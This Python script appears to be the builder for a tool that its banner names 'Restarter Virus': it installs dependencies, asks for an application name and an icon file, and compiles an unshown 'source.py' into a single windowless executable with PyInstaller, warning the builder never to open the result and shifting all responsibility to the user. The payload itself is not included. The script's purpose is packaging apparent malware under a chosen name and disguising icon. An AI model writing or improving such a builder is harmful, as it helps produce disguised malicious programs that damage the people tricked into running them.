import subprocess
import sys
import os


def clear_cmd():
    if os.name == 'nt':
        _ = os.system('cls')
    else:
        _ = os.system('clear')


def run_pyinstaller(name, icon):
    app_name = name
    app_icon = icon
    script_name = "source.py"
    current_directory = os.getcwd()
    
    if not os.path.exists(script_name):
        print(f'File {script_name} was not found!!!')

    pyinstaller_command = f"pyinstaller -F -w --name {app_name} --icon={app_icon} {script_name}"
    
    try:
        result = subprocess.run(pyinstaller_command, shell=True, check=True, text=True)
        clear_cmd()
        logo()
        print('')
        print('')
        print('Finished!')
        print(f'{app_name} was successfully created in < /dist > folder.')
        print('\n||| WARNING: Never open the program!!! |||')
        print('')
        print('Press ANY key to close...')
        key_pressed = keyboard.read_key()
        exit()

        
    except Exception as e:
        print(f"ERROR: {e}")


def ico_check(icon):
    filename = icon
    if os.path.splitext(filename)[1].lower() == ".ico":
        return True
    return False



def custom():
    name = input('\nEnter application name: ')
    name = name.replace(' ', '')
    i = False
    icon = ''
    while os.path.exists(icon) & i == False:
        icon = input('Enter icon path: ')
        i = ico_check(icon)
        if not os.path.exists(icon):
            print('Icon file does not exist!!!')
        elif i == False:
            print('File format must be <.ico>!')
    return name, icon



def start():
    logo()
    option = '-1'
    while option not in ('1', '2'):
        print('''
   | 1. Start
   | 2. Info
   | 3. Exit  

              
''')
        option = input('Enter your choice: ')
        if option == '1':
            app_name, app_icon = custom()
            run_pyinstaller(app_name, app_icon)
        if option == '2':
            try:
                logo()
                print('Guide:')
                print('')
                print('')
                with open('README.md', 'r', encoding='utf-8') as f:
                    content = f.read()
                    print(content)
                    print('')
                    print('')
                    back = input('Back to menu (Y/N)?: ')
                    if back.upper() == 'Y' or back.upper() == 'YES':
                        start()
                    else:
                        exit()

            except FileNotFoundError:
                print('Description file (README.md) was not found.')
            except Exception as e:
                print(f'ERROR: {e}')
        else:
            exit()



def logo():
        
    clear_cmd()
    print('')
    print('')
    print(r'''   
        ____  ____________________    ____  ________________ 
       / __ \/ ____/ ___/_  __/   |  / __ \/_  __/ ____/ __ \
      / /_/ / __/  \__ \ / / / /| | / /_/ / / / / __/ / /_/ / 
     / _, _/ /___ ___/ // / / ___ |/ _, _/ / / / /___/ _, _/  
    /_/ |_/_____//____//_/ /_/  |_/_/ |_| /_/ /_____/_/ |_|  V . 1                           
     _    __________  __  _______
    | |  / /  _/ __ \/ / / / ___/
    | | / // // /_/ / / / /\__ \ 
    | |/ // // _, _/ /_/ /___/ / 
    |___/___/_/ |_|\____//____/  Powered By MiRZA

        ''')



def rules():
    logo()
    print('''
Rules:

    1. All responsibility for using or misusing this software belongs to you.
    2. Selling this product is illegal.

    To confirm type < Y/Yes >...

        ''')
    confirm = input('Y/N: ')

    if confirm.upper() == 'Y' or confirm.upper() == 'YES':
        start()



def install(package):
    try:
        __import__(package)
        print(f'{package} was approved.')
    except ImportError:
        print(f'{package} not found!')
        try:
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
            print(f'{package} successfully installed.')
        except Exception as e:
            print(f'Install error {package}: {e}')
            exit()



packs = ('shutil', 'pywin32', 'PyInstaller', 'keyboard', 'Pillow')

for pack in packs:
    install(pack)

import keyboard

rules()